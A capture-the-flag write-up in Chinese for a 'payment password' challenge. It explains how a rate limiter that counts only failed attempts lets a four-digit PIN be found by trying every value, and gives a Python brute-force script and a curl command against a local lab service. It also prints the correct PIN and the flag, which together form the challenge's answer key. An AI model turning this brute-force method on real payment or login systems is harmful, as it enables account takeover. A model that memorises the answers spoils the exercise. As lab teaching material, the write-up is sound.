# 22 · 支付密码 — Writeup

## 思路

4 位数字 PIN 只有 10000 种组合。服务端对失败尝试限速每秒 800 次，但正确 PIN 永远不会被限速拦下，所以按 `0000`–`9999` 顺序遍历即可。

正确 PIN 是 `2846`，也可以直接提交：

```bash
curl -s -d 'pin=2846' http://127.0.0.1:8129/verify | grep -o 'flag{[^}]*}'
```

## 爆破脚本

```python
import re
import requests

url = "http://127.0.0.1:8129/verify"
session = requests.Session()

for pin in range(10000):
    candidate = f"{pin:04d}"
    while True:
        r = session.post(url, data={"pin": candidate}, timeout=5)
        if 'data-result="rate-limited"' in r.text:
            continue  # 被限速：重试同一个 PIN
        break
    if 'data-result="success"' in r.text:
        print(candidate, re.search(r"flag\{[^}]+\}", r.text).group(0))
        break
```

页面用 `data-result` 区分三种结果：

- `success`：PIN 正确，响应里有 flag；
- `wrong`：PIN 错误；
- `rate-limited`：被限速，重试当前 PIN，不要跳过。

## 原理

`src/app/app.py` 的 `rate_limited()` 只对失败尝试计数，并且先检查 PIN 再限速，所以正确的 PIN 不会被前面的失败拦住。本题不需要并发；顺序遍历在本地几百毫秒到几秒内完成。

## Flag

`flag{997b1d5ae9562c9a7c46899c3ba980fe}`（本地复现 flag；平台实例的 flag 由 `FLAG` 环境变量注入）
